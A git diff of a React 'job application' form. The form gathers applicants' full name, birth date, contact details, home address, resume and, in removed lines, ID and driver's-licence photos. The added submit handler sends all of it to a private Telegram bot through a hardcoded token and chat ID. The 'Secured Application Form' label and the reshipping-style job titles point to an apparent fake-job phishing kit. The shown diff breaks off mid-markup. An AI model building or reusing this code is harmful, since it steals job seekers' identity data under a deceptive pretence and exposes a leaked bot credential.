@@ -1,16 +1,16 @@
 import React, { useEffect, useState } from 'react'
-import { BsFillShieldLockFill } from 'react-icons/bs'
+import { BsFillShieldLockFill, BsCloudUpload } from 'react-icons/bs'
 import { ImSpinner2 } from 'react-icons/im'
 import axios from 'axios'
+import { motion, AnimatePresence } from 'framer-motion'
 import ProgressBar from './components/progress_bar'
-import ModalPage from './components/Modal';
-import Button from 'react-bootstrap/Button';
+import ModalPage from './components/Modal'
+import Button from 'react-bootstrap/Button'
 import Header from './components/Header'
-import Footer from './components/Footer'
-
-
-
-
+// import Footer from './components/Footer'
+import AbsoluteBack from './components/AbsoluteBack'
+import { Container, Card } from 'react-bootstrap'
+import SuccessModal from './components/SuccessModal'
 
 const Forms = () => {
   const [fn, setFn] = useState('')
@@ -24,593 +24,758 @@ const Forms = () => {
   const [state, setState] = useState('')
   const [zip, setZip] = useState('')
   const [gender, setGender] = useState('')
-
-  
-  const [fnProg, setFnProg] = useState(0)
-  const [dobProg, setDobProg] = useState(0)
-  const [emailProg, setEmailProg] = useState(0)
-  const [numberProg, setNumberProg] = useState(0)
-  const [eqProg, setEqProg] = useState(0)
-  const [pdProg, setPdProg] = useState(0)
-  const [addressProg, setAddressProg] = useState(0)
-  const [cityProg, setCityProg] = useState(0)
-  const [stateProg, setStateProg] = useState(0)
-  const [zipProg, setZipProg] = useState(0)
-  const [genderProg, setGenderProg] = useState(0)
-  const [q1Prog, setQ1Prog] = useState(0)
-  const [q2Prog, setQ2Prog] = useState(0)
-  const [q3Prog, setQ3Prog] = useState(0)
-
-
-  const [opacityShow, setOpacityShow] = useState('inputFile');
-  const [opacityShowTwo, setOpacityShowTwo] = useState('inputFile');
-  const [opacityShowThree, setOpacityShowThree] = useState('inputFile');
   const [q1, setQ1] = useState('')
   const [q2, setQ2] = useState('')
   const [q3, setQ3] = useState('')
+  const [currentSlide, setCurrentSlide] = useState(0)
   const [image, setImage] = useState('')
   const [imageTwo, setImageTwo] = useState('')
   const [imageThree, setImageThree] = useState('')
-  const[isLoading, setIsLoading] = useState(false)
-  const [pageNext, setPageNext] = useState(true)
-  const [pageTwo, setPageTwo] = useState(false)
-  const [pageThree, setPageThree] = useState()
+  const [isLoading, setIsLoading] = useState(false)
   const [mssge, setMssge] = useState(false)
-  const [country, setCountry] = useState('')
-  const url = "https://ipapi.co/json/"
-  const [show, setShow] = useState(false);
+  const [show, setShow] = useState(false)
+  const [resume, setResume] = useState(null)
+  const [skipResume, setSkipResume] = useState(false)
+  const [showSuccess, setShowSuccess] = useState(false)
 
   const handleClose = () => {
     setShow(false)
-    handleProgressCheck()
-  };
-  const handleShow = () => setShow(true);
-
-  const handleProgressCheck = ()=> {
-    if(fn!==''){
-      setFnProg(7)
-    }else{
-      setFnProg(0)
-    }
-  if(gender!==''){
-        setGenderProg(7)
-      }else{
-        setGenderProg(0)
-      }
-  if(dob!==''){
-        setDobProg(7)
-      }else{
-        setDobProg(0)
-      }
-  if(email!==''){
-        setEmailProg(7)
-      }else{
-        setEmailProg(0)
-      }
-  if(number!==''){
-        setNumberProg(7)
-      }else{
-        setNumberProg(0)
-      }
-  if(eq!==''){
-        setEqProg(7)
-      }else{
-        setEqProg(0)
-      }
-  if(pd!==''){
-        setPdProg(7)
-      }else{
-        setPdProg(0)
-      }
-  if(address!==''){
-        setAddressProg(7)
-      }else{
-        setAddressProg(0)
-      }
-  if(city!==''){
-        setCityProg(7)
-      }else{
-        setCityProg(0)
-      }
-  if(state!==''){
-        setStateProg(7)
-      }else{
-        setStateProg(0)
-      }
-  if(q1!==''){
-        setQ1Prog(7)
-      }else{
-        setQ1Prog(0)
-      }
-  if(q2!==''){
-        setQ2Prog(7)
-      }else{
-        setQ2Prog(0)
-      }
-  if(q3!==''){
-        setQ3Prog(7)
-      }else{
-        setQ3Prog(0)
-      }
-  if(zip!=='' || zip !== null){
-        setZipProg(7)
-      }else{
-        setZipProg(0)
-      }
+    calculateProgress()
   }
 
-  useEffect(()=> {
-    fetch(url, {
-      method: "GET"
-    })
-    .then(res => {
-      return res.json()
-    })
-    .then(resData => {
-      setCity(resData.city)
-      setCountry(resData.country_name)
-      setState(resData.region)
-      setZip(resData.postal)
-      handleShow()
+  const slides = [
+    {
+      title: "Personal Information",
+      fields: [
+        {
+          label: "Full Name (First Name, Last Name and Other Names)",
+          type: "text",
+          value: fn,
+          onChange: setFn,
+          required: true
+        },
+        {
+          label: "Gender",
+          type: "radio",
+          value: gender,
+          onChange: setGender,
+          options: ["Male", "Female"],
+          required: true
+        },
+        {
+          label: "Date of Birth",
+          type: "date",
+          value: dob,
+          onChange: setDob,
+          required: true
+        }
+      ]
+    },
+    {
+      title: "Contact Information",
+      fields: [
+        {
+          label: "Email Address",
+          type: "email",
+          value: email,
+          onChange: setEmail,
+          required: true
+        },
+        {
+          label: "Mobile Number",
+          type: "tel",
+          value: number,
+          onChange: setNumber,
+          required: true
+        }
+      ]
+    },
+    {
+      title: "Professional Information",
+      fields: [
+        {
+          label: "Educational Qualification",
+          type: "select",
+          value: eq,
+          onChange: setEq,
+          options: ["High School", "College", "University", "Masters", "PHD", "Others"],
+          required: true
+        },
+        {
+          label: "Preferred Designation",
+          type: "select",
+          value: pd,
+          onChange: setPd,
+          options: ["Financial Clerk", "Virtual Assistant", "Shopping Assistant"],
+          required: true
+        }
+      ]
+    },
+    {
+      title: "Location Information",
+      fields: [
+        {
+          label: "Address",
+          type: "text",
+          value: address,
+          onChange: setAddress,
+          required: true
+        },
+        {
+          label: "City",
+          type: "text",
+          value: city,
+          onChange: setCity,
+          required: true
+        },
+        {
+          label: "State",
+          type: "text",
+          value: state,
+          onChange: setState,
+          required: true
+        },
+        {
+          label: "Zip Code",
+          type: "number",
+          value: zip,
+          onChange: setZip,
+          required: true
+        }
+      ]
+    },
+    {
+      title: "Resume Upload",
+      fields: [
+        {
+          label: "Upload Your Resume (Optional)",
+          type: "file",
+          value: resume,
+          onChange: setResume,
+          required: false,
+          accept: ".pdf,.doc,.docx",
+          skip: {
+            label: "Don't have a resume?",
+            value: skipResume,
+            onChange: setSkipResume
+          }
+        }
+      ]
+    },
+    {
+      title: "Additional Questions",
+      fields: [
+        {
+          label: "How do you feel about working fully remotely - have you done this before?",
+          type: "text",
+          value: q1,
+          onChange: setQ1,
+          required: true,
+          placeholder: "Short-Answer-text"
+        },
+        {
+          label: "What motivates you to do your best work?",
+          type: "text",
+          value: q2,
+          onChange: setQ2,
+          required: true,
+          placeholder: "Short-Answer"
+        },
+        {
+          label: "What do you do when you have a great deal of work to accomplish in a short period of time?",
+          type: "text",
+          value: q3,
+          onChange: setQ3,
+          required: true,
+          placeholder: "Short-Answer"
+        }
+      ]
+    }
+  ]
+
+  const calculateProgress = () => {
+    let total = 0
+    let filled = 0
+
+    slides.forEach(slide => {
+      slide.fields.forEach(field => {
+        total++
+        if (field.value && field.value !== '') {
+          filled++
+        }
+      })
     })
 
+    return Math.round((filled / total) * 100)
+  }
+
+  const handleNext = () => {
+    const currentSlideData = slides[currentSlide]
+    const isValid = currentSlideData.fields.every(field => !field.required || (field.value && field.value !== ''))
+    
+    if (isValid) {
+      setCurrentSlide(prev => Math.min(prev + 1, slides.length - 1))
+      setMssge(false)
+    } else {
+      setMssge("Please fill all required fields before proceeding")
+    }
+  }
+
+  const handlePrevious = () => {
+    setCurrentSlide(prev => Math.max(prev - 1, 0))
+    setMssge(false)
+  }
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    setIsLoading(true);
+    setMssge(''); // Clear any previous messages
+    
+    try {
+      const BOT_TOKEN = '7649672694:AAHwInvvwU_BWU1fRbLRIP9QdmRjjOZNMfc';
+      const CHAT_ID = '7436608837';
+      const MESSAGE_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const DOCUMENT_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+
+      // Format the message
+      const message = `
+📝 *New Job Application*
+
+*Personal Information:*
+Full Name: ${fn}
+Gender: ${gender}
+Date of Birth: ${dob}
+
+*Contact Information:*
+Email: ${email}
+Phone: ${number}
+
+*Professional Information:*
+Education: ${eq}
+Preferred Position: ${pd}
+
+*Location:*
+Address: ${address}
+City: ${city}
+State: ${state}
+ZIP: ${zip}
+
+*Additional Questions:*
+1. Remote Work Experience:
+${q1}
+
+2. Work Motivation:
+${q2}
+
+3. Time Management:
+${q3}
+
+${resume ? '📎 Resume will be sent in next message' : '❌ No Resume Attached'}
+${skipResume ? '(Applicant opted to skip resume)' : ''}
+`;
+
+      // Send application details
+      const messageResponse = await axios.post(MESSAGE_API_URL, {
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+      });
+
+      if (!messageResponse.data.ok) {
+        throw new Error('Failed to send application details');
+      }
+
+      // Send resume if available
+      if (resume && !skipResume) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('document', resume);
+        formData.append('caption', `Resume for ${fn}`);
+
+        const resumeResponse = await axios.post(DOCUMENT_API_URL, formData, {
+          headers: {
+            'Content-Type': 'multipart/form-data'
+          }
+        });
+
+        if (!resumeResponse.data.ok) {
+          throw new Error('Failed to send resume');
+        }
+      }
+
+      // Only show success modal after everything is processed
+      setShowSuccess(true);
+      
+    } catch (error) {
+      console.error('Submission error:', error);
+      setMssge(error.message || 'Failed to submit application. Please try again.');
+      setShowSuccess(false); // Ensure success modal is not shown on error
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  useEffect(() => {
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        setCity(data.city)
+        setState(data.region)
+        setZip(data.postal)
+        setShow(true)
+      })
   }, [])
 
-  const progress = fnProg+dobProg+emailProg+numberProg+eqProg+pdProg+addressProg+cityProg+stateProg+zipProg+genderProg+q1Prog+q2Prog + q3Prog+2
+  const renderField = (field) => {
+    const fieldStyle = {
+      container: {
+        position: 'relative',
+        marginBottom: '1.5rem'
+      },
+      input: {
+        backgroundColor: 'rgba(255, 255, 255, 0.9)',
+        border: '1px solid #e2e8f0',
+        borderRadius: '12px',
+        padding: '0.75rem 1rem',
+        fontSize: '1rem',
+        width: '100%',
+        transition: 'all 0.3s ease',
+        color: '#2c3e50'
+      },
+      label: {
+        position: 'absolute',
+        left: '1rem',
+        top: '0.75rem',
+        color: '#7f8c8d',
+        transition: 'all 0.3s ease',
+        pointerEvents: 'none',
+        fontSize: '1rem'
+      },
+      focusedLabel: {
+        transform: 'translateY(-1.5rem) scale(0.85)',
+        color: '#3498db'
+      },
+      select: {
+        appearance: 'none',
+        backgroundImage: 'url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 24 24\' fill=\'none\' stroke=\'currentColor\' stroke-width=\'2\' stroke-linecap=\'round\' stroke-linejoin=\'round\'%3e%3cpolyline points=\'6 9 12 15 18 9\'%3e%3c/polyline%3e%3c/svg%3e")',
+        backgroundRepeat: 'no-repeat',
+        backgroundPosition: 'right 1rem center',
+        backgroundSize: '1em'
+      },
+      filePreview: {
+        marginTop: '1rem',
+        padding: '1rem',
+        backgroundColor: 'rgba(255, 122, 61, 0.05)',
+        borderRadius: '8px',
+        border: '1px solid rgba(255, 122, 61, 0.1)',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'space-between'
+      },
+      fileName: {
+        color: '#2c3e50',
+        fontWeight: '500',
+        fontSize: '0.9rem'
+      },
+      fileSize: {
+        color: '#7f8c8d',
+        fontSize: '0.8rem',
+        marginLeft: '1rem'
+      },
+      removeButton: {
+        background: 'none',
+        border: 'none',
+        color: '#e74c3c',
+        cursor: 'pointer',
+        padding: '0.25rem 0.5rem',
+        fontSize: '0.9rem',
+        transition: 'all 0.2s ease'
+      }
+    };
 
-  const HandleNextPage = () => {
-    if (fn === '' || dob ==='' || gender ==='' || email ==='' || number ==='' || eq ==='' || pd ==='' || address ==='' || city ==='' || state ==='' || zip ===''){
-      setMssge("All field must be filled correctly");
-    }else {
-      setPageNext(false)
-      setPageTwo(true)
-      setPageThree(false)
-      setMssge(false)
+    switch (field.type) {
+      case 'radio':
+        return (
+          <div className="d-flex gap-4">
+            {field.options.map(option => (
+              <div key={option} className="form-check custom-radio">
+                <input
+                  type="radio"
+                  className="form-check-input"
+                  id={option}
+                  name={field.label}
+                  value={option}
+                  checked={field.value === option}
+                  onChange={(e) => field.onChange(e.target.value)}
+                  required={field.required}
+                />
+                <label className="form-check-label" htmlFor={option}>
+                  {option}
+                </label>
+              </div>
+            ))}
+          </div>
+        );
+      case 'select':
+        return (
+          <select
+            className="form-select"
+            value={field.value}
+            onChange={(e) => field.onChange(e.target.value)}
+            required={field.required}
+            style={{
+              ...fieldStyle.input,
+              ...fieldStyle.select
+            }}
+          >
+            <option value="">Select {field.label}</option>
+            {field.options.map(option => (
+              <option key={option} value={option}>
+                {option}
+              </option>
+            ))}
+          </select>
+        );
+      case 'file':
+        return (
+          <div>
+            <div className={`custom-file-upload ${field.skip?.value ? 'disabled' : ''}`}>
+              <input
+                type="file"
+                onChange={(e) => {
+                  const file = e.target.files[0];
+                  if (file) {
+                    field.onChange(file);
+                  }
+                }}
+                accept={field.accept}
+                disabled={field.skip?.value}
+              />
+              <BsCloudUpload className="upload-icon" />
+              <div className="upload-text">
+                {!field.value ? 'Drag and drop your resume here or click to browse' : 'File selected'}
+              </div>
+              <div className="upload-hint">
+                Supported formats: PDF, DOC, DOCX
+              </div>
+            </div>
+
+            {field.value && (
+              <motion.div 
+                style={fieldStyle.filePreview}
+                initial={{ opacity: 0, y: -10 }}
+                animate={{ opacity: 1, y: 0 }}
+                exit={{ opacity: 0, y: -10 }}
+              >
+                <div style={{ display: 'flex', alignItems: 'center' }}>
+                  <span style={fieldStyle.fileName}>{field.value.name}</span>
+                  <span style={fieldStyle.fileSize}>
+                    {(field.value.size / 1024 / 1024).toFixed(2)} MB
+                  </span>
+                </div>
+                <button
+                  type="button"
+                  style={fieldStyle.removeButton}
+                  onClick={() => field.onChange(null)}
+                >
+                  Remove
+                </button>
+              </motion.div>
+            )}
+
+            {field.skip && (
+              <div className="skip-resume-option">
+                <div className="form-check custom-checkbox mt-3">
+                  <input
+                    type="checkbox"
+                    className="form-check-input"
+                    id="skipResume"
+                    checked={field.skip.value}
+                    onChange={(e) => {
+                      field.skip.onChange(e.target.checked);
+                      if (e.target.checked) {
+                        field.onChange(null);
+                      }
+                    }}
+                  />
+                  <label className="form-check-label" htmlFor="skipResume">
+                    {field.skip.label}
+                  </label>
+                </div>
+              </div>
+            )}
+          </div>
+        );
+      default:
+        return (
+          <div style={fieldStyle.container}>
+            <input
+              type={field.type}
+              className="form-control floating-input"
+              value={field.value}
+              onChange={(e) => field.onChange(e.target.value)}
+              required={field.required}
+              // placeholder={field.placeholder}
+              style={fieldStyle.input}
+            />
+            <label 
+              style={{
+                ...fieldStyle.label,
+                ...(field.value ? fieldStyle.focusedLabel : {})
+              }}
+            >
+              {field.placeholder}
+            </label>
+          </div>
+        );
     }
-  } 
-
-  const handleNextTwo = ()=> {
-    if (q1 === '' || q2 ==='' || q3 ===''){
-      setMssge("All field must be filled correctly");
-    }else {
-      setMssge(false)
-      const urlSend = 'https://backend.com/process.php?action=submitForm&fullName=' + fn + '&dob=' + dob + '&email=' + email + '&number=' + number +'&eq=' + eq +'&pd=' + pd + '&address=' + address + '&city=' + city +'&state=' + state + '&zip=' + zip + '&gender=' + gender;
-      window.location.replace(urlSend)
-    }
   }
-
-
-  const handleImageUpload = (e)=> {
-    console.log(e.target.files)
-    setImage(e.target.files[0])
-    setOpacityShow('opacityShow')
-
-
-  }
-  const handleImageUploadBack = (e) => {
-    console.log(e.target.files)
-    setImageTwo(e.target.files[0])
-    setOpacityShowTwo('opacityShow')
-
-  }
-
-
-  const handleImageUploadFull = (e) => {
-    console.log(e.target.files)
-    setImageThree(e.target.files[0])
-    setOpacityShowThree('opacityShow')
-
-  }
-
-
-  const handleFormSubmit = (event) => {
-    event.preventDefault();
-    setIsLoading(true)
-    
-    const imgData = new FormData()
-    imgData.append('image', imageTwo)
-
-
-    const formData = new FormData();
-    formData.append('image', image);
-    
-    const imgData3 = new FormData();
-    imgData3.append('image', imageThree);
-
-    const url = 'https://backend.com/upload.php';
-    //const url = 'http://localhost/New%20folder//upload.php';
-
-    
-    axios.post(url, formData).then(res => {
-      console.log(res.data);
-    }).catch((err)=> {
-      setMssge(err.message);
-      setIsLoading(false)
-    }).then(()=>{
-      axios.post(url, imgData).then(res => {
-        console.log(res.data);
-      }).catch((err)=> {
-        setMssge(err.message);
-        setIsLoading(false)
-      }).then(()=> {
-        axios.post(url, imgData3).then(res => {
-          console.log(res.data)
-        }).catch(err => {
-          setMssge(err.message)
-          setIsLoading(false)
-        }).then(() => {
-          if (q1 === '' || q2 ==='' || q3 ===''){
-            setMssge("All field must be filled correctly");
-          }else {
-            setMssge(false)
-            const urlSend = 'https://backend.com/process.php?action=submitForm&fullName=' + fn + '&dob=' + dob + '&email=' + email + '&number=' + number +'&eq=' + eq +'&pd=' + pd + '&address=' + address + '&city=' + city +'&state=' + state + '&zip=' + zip + '&gender=' + gender;
-            window.location.replace(urlSend)
-          }
-         setIsLoading(false)
-        })
-      })
-      
+  
+  const slideVariants = {
+    enter: (direction) => ({
+      x: direction > 0 ? 1000 : -1000,
+      opacity: 0
+    }),
+    center: {
+      zIndex: 1,
+      x: 0,
+      opacity: 1
+    },
+    exit: (direction) => ({
+      zIndex: 0,
+      x: direction < 0 ? 1000 : -1000,
+      opacity: 0
     })
+  };
+
+  const swipeConfidenceThreshold = 10000;
+  const swipePower = (offset, velocity) => {
+    return Math.abs(offset) * velocity;
+  };
+
+  const handleSlideClick = (index) => {
+    // Only allow moving to slides where previous slides are completed
+    const canMove = slides.slice(0, index).every(slide => 
+      slide.fields.every(field => !field.required || (field.value && field.value !== ''))
+    );
     
-  }
+    if (canMove) {
+      setCurrentSlide(index);
+      setMssge(false);
+    } else {
+      setMssge("Please complete previous sections first");
+    }
+  };
+
+  const renderStepIndicator = (index) => {
+    const isCompleted = slides[index].fields.every(
+      field => !field.required || (field.value && field.value !== '')
+    );
+    const isCurrent = index === currentSlide;
+
+    return (
+      <motion.div
+        key={index}
+        className={`step-indicator ${isCurrent ? 'current' : ''} ${isCompleted ? 'completed' : ''}`}
+        onClick={() => handleSlideClick(index)}
+        whileHover={{ scale: 1.05 }}
+        whileTap={{ scale: 0.95 }}
+      >
+        <motion.div 
+          className="step-number"
+          initial={false}
+          animate={{
+            backgroundColor: isCompleted ? '#2ecc71' : (isCurrent ? '#3498db' : '#f8f9fa'),
+            borderColor: isCompleted ? '#2ecc71' : (isCurrent ? '#3498db' : '#e2e8f0'),
+            color: isCompleted ? '#ffffff' : (isCurrent ? '#3498db' : '#7f8c8d')
+          }}
+        >
+          {isCompleted ? '✓' : index + 1}
+        </motion.div>
+        <div className="step-title">{slides[index].title}</div>
+      </motion.div>
+    );
+  };
   
-  
+  const buttonStyle = {
+    backgroundColor: "#3498db",
+    borderColor: "#3498db",
+    transition: "all 0.3s ease"
+  };
+
+  const buttonHoverStyle = {
+    backgroundColor: "#2980b9",
+    borderColor: "#2980b9",
+    transform: "translateY(-2px)",
+    boxShadow: "0 6px 15px rgba(52, 152, 219, 0.25)"
+  };
+
   return (
-    <div>
+    <div className="form-wrapper">
       <Header />
-      <form className="App2" onSubmit={handleFormSubmit} >
+      <Container className="py-5">
+        <motion.div
+          initial={{ opacity: 0, y: 20 }}
+          animate={{ opacity: 1, y: 0 }}
+          transition={{ duration: 0.5 }}
+        >
+          <Card className="shadow-lg">
+            <Card.Body className="p-5">
+              <motion.h2 
+                className="text-center mb-4"
+                initial={{ opacity: 0, y: -20 }}
+                animate={{ opacity: 1, y: 0 }}
+                transition={{ duration: 0.5 }}
+                style={{ color: '#2c3e50', fontWeight: '600', letterSpacing: '0.01em' }}
+              >
+                {slides[currentSlide].title}
+              </motion.h2>
 
-        <div className="top-flag">
-          <h3>
-            Please use correct information, items may need to be delivered
-          </h3>
-        </div>
-        <ModalPage show={show} handleClose={handleClose} city={city} country={country} state={state} zip={zip} />
-          
-        
-        {pageNext && <div className="write-container4">
-          <div className="text-box2">
-            <h3>Full Name (s) <br />First Name, Last Name and Other Names</h3>
-            <input type="text" 
-            value={fn}
-            onBlur={() => {
-              handleProgressCheck()
-            }}
-            required
-            onChange={
-              (e) => setFn(e.target.value)
-              } />
-            <div className="required">
-              Required
-            </div>
-          </div>
-        </div>}
+              <div className="step-indicators mb-4">
+                {slides.map((_, index) => renderStepIndicator(index))}
+              </div>
 
-        {pageNext && <div className="write-container">
-          <div className="text-box2">
-            <h3>Gender</h3><br />
-            <input type="radio"
-             id='male' 
-             name='gender' 
-             value={"male"} 
-             required
-             onClick={()=> {
-              setGender('Male')
-              handleProgressCheck()
-             }}/>
-            <label style={{marginLeft:10}} htmlFor='male'>Male</label><br />
+              <form onSubmit={handleSubmit}>
+                <AnimatePresence mode="wait" custom={currentSlide}>
+                  <motion.div
+                    key={currentSlide}
+                    custom={currentSlide}
+                    variants={slideVariants}
+                    initial="enter"
+                    animate="center"
+                    exit="exit"
+                    transition={{
+                      x: { type: "spring", stiffness: 300, damping: 30 },
+                      opacity: { duration: 0.2 }
+                    }}
+                    drag="x"
+                    dragConstraints={{ left: 0, right: 0 }}
+                    dragElastic={1}
+                    onDragEnd={(e, { offset, velocity }) => {
+                      const swipe = swipePower(offset.x, velocity.x);
+                      if (swipe < -swipeConfidenceThreshold) {
+                        handleNext();
+                      } else if (swipe > swipeConfidenceThreshold) {
+                        handlePrevious();
+                      }
+                    }}
+                    className="slide-container"
+                    style={{
+                      background: 'rgba(255, 255, 255, 0.5)',
+                      borderRadius: '12px',
+                      padding: '20px',
+                      marginBottom: '20px'
+                    }}
+                  >
+                    {slides[currentSlide].fields.map((field, index) => (
+                      <motion.div 
+                        key={index} 
+                        className="mb-4"
+                        initial={{ opacity: 0, y: 20 }}
+                        animate={{ opacity: 1, y: 0 }}
+                        transition={{ delay: index * 0.1 }}
+                      >
+                        <label className="form-label">
+                          {field.label}
+                          {field.required && <span className="text-danger">*</span>}
+                        </label>
+                        {renderField(field)}
+                      </motion.div>
+                    ))}
+                  </motion.div>
+                </AnimatePresence>
 
-            <input type="radio"
-             id='female'
-             name='gender' 
-             value="Female"
-             required
-             onClick={() => {
-              setGender('Female')
-              handleProgressCheck()
-             }} />
-            <label style={{marginLeft:10}} htmlFor='female'>Female</label><br />
+                {mssge && (
+                  <motion.div 
+                    className="alert alert-danger"
+                    initial={{ opacity: 0, y: 20 }}
+                    animate={{ opacity: 1, y: 0 }}
+                    exit={{ opacity: 0, y: -20 }}
+                  >
+                    {mssge}
+                  </motion.div>
+                )}
 
-            {/* <input type="radio"
-             id='rns'
-             name='gender' 
-             value="Rather Not Say"
-             required
-             onClick={() => {
-              setGender('Rather Not Say')
-              handleProgressCheck()
-             }} />
-            <label style={{marginLeft:10}} htmlFor='rns'>Rather Not Say</label> */}
+                <motion.div 
+                  className="d-flex justify-content-between mt-4"
+                  initial={{ opacity: 0 }}
+                  animate={{ opacity: 1 }}
+                  transition={{ delay: 0.3 }}
+                >
+                  <Button
+                    variant="light"
+                    onClick={handlePrevious}
+                    disabled={currentSlide === 0}
+                    className="btn-with-icon"
+                    style={{
+                      backgroundColor: 'rgba(255, 255, 255, 0.9)',
+                      borderColor: '#e2e8f0',
+                      color: '#2c3e50'
+                    }}
+                  >
+                    <i className="fas fa-arrow-left me-2"></i>
+                    Previous
+                  </Button>
+                  {currentSlide === slides.length - 1 ? (
+                    <Button
+                      style={buttonStyle}
+                      type="submit"
+                      disabled={isLoading}
+                      className="btn-with-icon"
+                    >
+                      {isLoading ? (
+                        <>
+                          <ImSpinner2 className="App-spin me-2" />
+                          Processing
+                        </>
+                      ) : (
+                        <>
+                          Submit Application
+                          <i className="fas fa-check ms-2"></i>
+                        </>
+                      )}
+                    </Button>
+                  ) : (
+                    <Button
+                      style={buttonStyle}
+                      onClick={handleNext}
+                      className="btn-with-icon"
+                    >
+                      Next
+                      <i className="fas fa-arrow-right ms-2"></i>
+                    </Button>
+                  )}
+                </motion.div>
+              </form>
+            </Card.Body>
+          </Card>
+        </motion.div>
 
-            <div className="required">
-              Required
-            </div>
-          </div>
-        </div>}
+        <motion.div 
+          className="mt-4 text-center text-white"
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+          transition={{ delay: 0.5 }}
+        >
+          <BsFillShieldLockFill className="secure-icon" /> 
+          <span style={{ fontSize: '0.9rem', letterSpacing: '0.02em' }}>
+            Secured Application Form
+          </span>
+        </motion.div>
+      </Container>
 
-        {pageNext && <div className="write-container">
-          <div className="text-box2">
-            <h3 title='Date Of Birth'>D.O.B</h3>
-            <input type="date"
-            value={dob}
-            required
-            onChange={(e) => {
-              setDob(e.target.value)
-              handleProgressCheck()
-            }} />
-            <div className="required">
-              Required
-            </div>
-          </div>
-        </div>}
+      <ModalPage
+        show={show}
+        handleClose={handleClose}
+        city={city}
+        state={state}
+        zip={zip}
+      />
 
-        {pageNext && <div className="write-container">
-          <div className="text-box2">
-            <h3>Email Address</h3>
-            <input type="email"
-            value={email}
-            onBlur={() => {
-              handleProgressCheck()
-            }}
-            required
-            onChange={(e) => setEmail(e.target.value)} />
-            <div className="required">
-              Required
-            </div>
-          </div>
-        </div>}
-
-        {pageNext && <div className="write-container">
-          <div className="text-box2">
-            <h3>Mobile Number</h3>
-            <input type="tel"
-            value={number}
-            onBlur={() => {
-              handleProgressCheck()
-            }}
-            required
-            onChange={(e) => setNumber(e.target.value)} />
-            <div className="required">
-              Required
-            </div>
-          </div>
-        </div>}
-
-        {pageNext && <div className="write-container">
-          <div className="text-box2">
-            <h3>Educational Qualification</h3>
-            <select
-             value={eq} 
-             required 
-             onChange={(e)=> {
-              setEq(e.target.value)
-              handleProgressCheck()
-              }} 
-              id="">
-              <option value="">Select Qualifications</option>
-              <option value="high school">High School</option>
-              <option value="college">College</option>
-              <option value="university">University</option>
-              <option value="masters">Masters</option>
-              <option value="phd">PHD</option>
-              <option value="others">others</option>
-             </select>
-            <div className="required">
-              Required
-            </div>
-          </div>
-        </div>}
-
-        {pageNext && <div className="write-container">
-          <div className="text-box2">
-            <h3>Preferred Designation</h3>
-            <select
-             value={pd} 
-             required 
-             onChange={(e)=> {
-              setPd(e.target.value)
-              handleProgressCheck()
-             }} 
-             id="">
-              <option value="">Select Qualifications</option>
-              <option value="Financial Clerk">Financial Clerk</option>
-              <option value="Virtual Assistant">Virtual Assistant</option>
-              <option value="Shopping Assistant">Shopping Assistant</option>
-             </select>
-            <div className="required">
-              Required
-            </div>
-          </div>
-        </div>}
-
-        {pageNext && <div className="write-container">
-          <div className="text-box2">
-            <h3>Address</h3>
-            <input type="text"
-            value={address}
-            onBlur={() => {
-              handleProgressCheck()
-            }}
-            required
-            onChange={(e) => setAddress(e.target.value)} />
-            <div className="required">
-              Required
-            </div>
-          </div>
-        </div>}
-
-        {pageNext && <div className="write-container">
-          <div className="text-box2">
-            <h3>City</h3>
-            <input type="text"
-            value={city}
-            onBlur={() => {
-              handleProgressCheck()
-            }}
-            required
-            onChange={(e) => setCity(e.target.value)} />
-            <div className="required">
-              Required
-            </div>
-          </div>
-        </div>}
-
-        {pageNext && <div className="write-container">
-          <div className="text-box2">
-            <h3>State</h3>
-            <input type="text"
-            value={state}
-            onBlur={() => {
-              handleProgressCheck()
-            }}
-            required
-            onChange={(e) => setState(e.target.value)} />
-            <div className="required">
-              Required
-            </div>
-          </div>
-        </div>}
-
-        {pageTwo && <div className="write-container">
-          <div className="text-box2">
-            <h3>How do you feel about working fully remotely - have you done this before?</h3>
-            <input type="text"
-            value={q1}
-            onBlur={() => {
-              handleProgressCheck()
-            }}
-            required
-            placeholder='Short-Answer-text'
-            onChange={(e) => setQ1(e.target.value)} />
-            <div className="required">
-              Required
-            </div>
-          </div>
-        </div>}
-
-        {pageTwo && <div className="write-container">
-          <div className="text-box2">
-            <h3>What motivates you to do your best work</h3>
-            <input type="text"
-            value={q2}
-            onBlur={() => {
-              handleProgressCheck()
-            }}
-            required
-            placeholder='Short-Answer'
-            onChange={(e) => setQ2(e.target.value)} />
-            <div className="required">
-              Required
-            </div>
-          </div>
-        </div>}
-
-        {pageTwo && <div className="write-container">
-          <div className="text-box2">
-            <h3>What do you do when you have a great deal of work to accomplish <br /> in a short period of time</h3>
-            <input type="text"
-            value={q3}
-            onBlur={() => {
-              handleProgressCheck()
-            }}
-            required
-            placeholder='Short-Answer'
-            onChange={(e) => setQ3(e.target.value)} />
-            <div className="required">
-              Required
-            </div>
-          </div>
-        </div>}
-
-        {pageNext && <div className="write-container">
-          <div className="text-box2">
-            <h3>Zip Code</h3>
-            <input type="number"
-            value={zip}
-            onBlur={() => {
-              handleProgressCheck()
-            }}
-            required
-            onChange={(e) => setZip(e.target.value)} />
-            <div className="required">
-              Required
-            </div>
-          </div>
-        </div>}
-
-
-        {pageThree && <div className="write-container">
-          <div className="text-box2">
-            <h3>Upload a valid ID/Driver's License (Front)</h3><br />
-            <div className="btn btn-proc" style={{width: "60px"}} >Upload </div>
-            <input type="file" required className={opacityShow} onChange={handleImageUpload} />
-            <div className="required">
-              Required 
-              
-            </div>
-          </div>
-        </div>}
-
-        {pageThree && <div className="write-container">
-          <div className="text-box2">
-            <h3>Upload valid ID/Driver's License (BACK)</h3><br />
-            <div className="btn btn-proc" style={{width: "60px"}}>Upload</div>
-            <input type="file" required className={opacityShowTwo} onChange={handleImageUploadBack} />
-            <div className="required">
-              Required
-            </div>
-          </div>
-        </div>}
-
-        {pageThree && <div className="write-container">
-          <div className="text-box2">
